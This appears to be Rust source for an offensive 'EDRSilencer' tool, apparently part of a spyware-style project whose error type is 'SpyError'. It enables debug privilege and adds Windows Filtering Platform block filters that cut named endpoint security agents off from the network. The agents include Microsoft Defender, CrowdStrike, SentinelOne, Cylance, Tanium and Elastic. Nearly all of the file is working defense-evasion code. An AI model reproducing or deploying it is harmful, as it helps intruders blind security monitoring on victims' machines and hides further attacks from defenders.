mod utils;

use std::collections::HashSet;
use std::path::Path;
use windows::Win32::NetworkManagement::WindowsFilteringPlatform::{
    FWPM_FILTER0,
    FWPM_FILTER_CONDITION0,
    FWPM_LAYER_ALE_AUTH_CONNECT_V4,
    FWPM_LAYER_ALE_AUTH_CONNECT_V6,
    FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4,
    FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6,
    FwpmEngineOpen0,
    FwpmFilterAdd0,
    FwpmTransactionBegin0,
    FwpmTransactionCommit0,
    FwpmTransactionAbort0,
};
use windows::Win32::Foundation::{HANDLE, ERROR_SUCCESS};
use windows::core::{GUID, Result as WindowsResult};

use crate::error::{Result, SpyError};

const EDR_PROCESSES: &[&str] = &[
    "MsMpEng.exe",
    "winlogbeat.exe",
    "SentinelAgent.exe",
    "SentinelOne.exe",
    "CrowdStrike.exe",
    "csfalcon.exe",
    "csshell.exe",
    "CylanceSvc.exe",
    "CylanceUI.exe",
    "TaniumClient.exe",
    "TaniumCX.exe",
    "TaniumDetectEngine.exe",
    "TaniumEndpointIndex.exe",
    "TaniumThreatResponse.exe",
    "elastic-agent.exe",
    "elastic-endpoint.exe",
];

#[derive(Debug)]
pub enum ErrorCode {
    Success = 0,
    InvalidArgument = 1,
    InsufficientPrivileges = 2,
    WfpError = 3,
    UnknownError = 4,
}

pub struct EDRSilencer {
    engine_handle: HANDLE,
    blocked_processes: HashSet<String>,
}

impl EDRSilencer {
    pub fn new() -> Result<Self> {
        if !utils::check_process_integrity_level()? {
            return Err(SpyError::UiaError("Insufficient privileges".into()));
        }

        utils::enable_se_debug_privilege()?;

        let mut engine_handle = HANDLE::default();
        unsafe {
            let result = FwpmEngineOpen0(None, None, None, None, &mut engine_handle);
            if result != ERROR_SUCCESS {
                return Err(SpyError::Windows(windows::core::Error::from_win32()));
            }
        }

        Ok(Self {
            engine_handle,
            blocked_processes: EDR_PROCESSES.iter().map(|&s| s.to_string()).collect(),
        })
    }

    pub fn is_edr_process(&self, process_name: &str) -> bool {
        self.blocked_processes.contains(process_name)
    }

    pub fn block_edr_process_traffic(&self, process_path: &Path) -> Result<()> {
        let nt_path = utils::convert_to_nt_path(process_path)?;
        
        unsafe {
            let result = FwpmTransactionBegin0(self.engine_handle, None);
            if result != ERROR_SUCCESS {
                return Err(SpyError::Windows(windows::core::Error::from_win32()));
            }

            let result = self.add_wfp_filters(&nt_path);
            
            if result.is_err() {
                FwpmTransactionAbort0(self.engine_handle);
                return result;
            }

            let result = FwpmTransactionCommit0(self.engine_handle);
            if result != ERROR_SUCCESS {
                return Err(SpyError::Windows(windows::core::Error::from_win32()));
            }
        }

        Ok(())
    }

    fn add_wfp_filters(&self, process_path: &str) -> Result<()> {
        let layers = [
            FWPM_LAYER_ALE_AUTH_CONNECT_V4,
            FWPM_LAYER_ALE_AUTH_CONNECT_V6,
            FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V4,
            FWPM_LAYER_ALE_AUTH_RECV_ACCEPT_V6,
        ];

        for layer in layers.iter() {
            let mut filter = FWPM_FILTER0::default();
            filter.layerKey = *layer;
            filter.action.type_ = windows::Win32::NetworkManagement::WindowsFilteringPlatform::FWP_ACTION_BLOCK;
            filter.weight.type_ = windows::Win32::NetworkManagement::WindowsFilteringPlatform::FWP_UINT8;
            filter.weight.uint8 = 15;

            let mut condition = FWPM_FILTER_CONDITION0::default();
            condition.fieldKey = windows::Win32::NetworkManagement::WindowsFilteringPlatform::FWPM_CONDITION_ALE_APP_ID;
            condition.matchType = windows::Win32::NetworkManagement::WindowsFilteringPlatform::FWP_MATCH_EQUAL;
            condition.conditionValue.type_ = windows::Win32::NetworkManagement::WindowsFilteringPlatform::FWP_BYTE_BLOB_TYPE;
            
            let wide_path: Vec<u16> = process_path.encode_utf16().chain(Some(0)).collect();
            condition.conditionValue.byteBlob = Some(&wide_path);

            filter.numFilterConditions = 1;
            filter.filterCondition = Some(&condition);

            unsafe {
                let result = FwpmFilterAdd0(self.engine_handle, &filter, None, None);
                if result != ERROR_SUCCESS {
                    return Err(SpyError::Windows(windows::core::Error::from_win32()));
                }
            }
        }

        Ok(())
    }
}

impl Drop for EDRSilencer {
    fn drop(&mut self) {
        unsafe {
            windows::Win32::NetworkManagement::WindowsFilteringPlatform::FwpmEngineClose0(self.engine_handle);
        }
    }
} 